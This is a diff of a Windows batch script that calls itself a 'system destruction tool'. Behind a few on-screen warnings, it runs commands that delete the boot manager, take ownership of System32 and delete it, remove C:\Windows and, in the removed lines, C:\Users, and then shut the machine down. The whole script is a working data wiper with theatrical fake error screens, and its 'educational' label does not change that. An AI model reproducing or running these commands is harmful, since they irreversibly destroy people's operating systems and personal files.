@@ -1,104 +1,91 @@
 @echo off
-title NEVERWARE SYSTEM DESTRUCTION TOOL
-color 4F
+setlocal enabledelayedexpansion
+chcp 65001 >nul
 cls
+title NEVERWARE SYSTEM DESTRUCTION TOOL - LEVEL 64
+mode con: cols=70 lines=25
 
+
+cls
 echo.
 echo !!! WARNING !!!
 echo This operation will DESTROY your system completely.
 echo This Tool is designed for educational purposes only.
-echo includes the OS, personal files, and system data.
-echo ONLY RUN THIS IN A VM OR TEST ENVIRONMENT
+echo It includes the OS, personal files, and system data.
+echo ONLY RUN THIS IN A VM OR TEST ENVIRONMEN.
 echo Press any key to CONTINUE, or close this window to CANCEL.
 pause >nul
 
+cls
 echo !!! WARNING !!!
 echo Are you sure you want to proceed?
 echo This action is IRREVERSIBLE and will DELETE ALL DATA.
-echo if u say yes this will delete everything on your computer.
-echo.
+echo if u say yes, this will delete everything on your computer.
 echo Press any key to CONTINUE, or close this window to CANCEL.
 pause >nul
 
+cls
 echo !!! FINAL WARNING !!!
 echo Last chance to cancel the operation.
 echo This will PERMANENTLY DELETE all files and folders.
-echo there is no way to recover them after this point.
-echo this is ur last chance to cancel the operation.
-echo.
+echo There is no way to recover them after this point.
+echo This is your last chance to cancel the operation.
 echo Press any key to CONTINUE, or close this window to CANCEL.
 pause >nul
 
-:: TEXT-TO-SPEECH CHAOS
-mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak ""You have triggered system destruction. This cannot be undone. Goodbye.""(window.close)")
-
-:: CHAOTIC BACKGROUND + SOUND LOOP
-setlocal enabledelayedexpansion
-for /l %%a in (1,1,60) do (
-    set /a "rand=!random! %% 15"
-    set /a "rand2=!random! %% 15"
-    color !rand!!rand2!
-    echo !!! SYSTEM MELTDOWN IN PROGRESS !!!
-    echo SYSTEM BREACH DETECTED... OVERLOAD %random%%random%%random%
-    echo ERROR CODE: 0x%random%%random%
-    echo .
-    timeout /t 0 >nul
-    echo ^G
-)
-endlocal
-
-echo Initializing TOTAL DESTRUCTION...
-timeout /t 2 /nobreak >nul
-echo Scanning for system partitions...
-timeout /t 2 >nul
-echo C:\ ... found.
-echo SYSTEM32 ... found.
-echo USER DATA ... found.
-timeout /t 1 >nul
-echo Preparing total system wipe...
-timeout /t 3 >nul
-
 cls
-echo Wiping system partitions...
-timeout /t 1 >nul
-echo [########                  ] 33%%
-timeout /t 1 >nul
-echo [###################       ] 78%%
-timeout /t 1 >nul
-echo [##########################] 100%%
+echo Warnings are over, starting destruction...
 timeout /t 2 >nul
 
-echo.
+set /a time_left=2
+
 echo Deleting TEMP files...
 del /f /s /q "%TEMP%\*.*" >nul 2>&1
-
+timeout /t 2 >nul
+cls
 echo Clearing Recycle Bin...
 rd /s /q C:\$Recycle.Bin >nul 2>&1
 
-echo Deleting system files...
-del /f /s /q C:\Windows\*.* >nul 2>&1
+timeout /t 1 >nul
+cls
+echo TEMP files and Recycle Bin cleared.
+
+set /a rand1=!random! %% 15
+set /a rand2=!random! %% 15
+color !rand1!!rand2!
+echo !!! WARNING: SYSTEM IN DANGER !!!
+timeout /t 1 >nul
+
+cls
+echo Deleting System files...
+timeout /t 2 >nul
+echo Deleting bootmgr...
+del /f /q C:\bootmgr >nul 2>&1
+rd /s /q C:\Boot >nul 2>&1
+
+timeout /t 1 >nul
+echo Deleting System32...
+takeown /f C:\Windows\System32 /r /d y >nul
+icacls C:\Windows\System32 /grant administrators:F /t >nul
+rd /s /q C:\Windows\System32 >nul 2>&1
+
+timeout /t 2 >nul
+cls
+echo Deleting Windows core files...
+del /f /q C:\Windows\*.* >nul 2>&1
 rd /s /q C:\Windows >nul 2>&1
 
-echo Deleting all user data...
-takeown /f C:\Users /r /d y >nul 2>&1
-icacls C:\Users /grant administrators:F /t >nul 2>&1
-rd /s /q C:\Users >nul 2>&1
+for /l %%i in (1,1,10) do (
+    set /a rand1=!random! %% 15
+    set /a rand2=!random! %% 15
+    color !rand1!!rand2!
+    echo WARNING: SYSTEM CRITICAL ERROR %random%
+    timeout /t 1 >nul
+)
 
-echo All user and system data purged.
-timeout /t 3 >nul
-
-:: FAKE BOOT ERROR SCREEN
 cls
-color 17
-echo.
-echo A problem has been detected and Windows has been shut down to prevent damage.
-echo.
-echo The system cannot find the OS bootloader.
-echo Please reinstall Windows or contact your system administrator.
-echo.
-echo *** STOP: 0x0000007B (0xFFFFF880009A9928, 0xFFFFFFFFC0000034, 0x0000000000000000)
-echo.
-echo Beginning dump of physical memory...
-timeout /t 5 >nul
+echo SYSTEM FAILURE - CRITICAL FILES MISSING
+echo 0xc000000e
+timeout /t 3 >nul
 
 shutdown /s /t 0
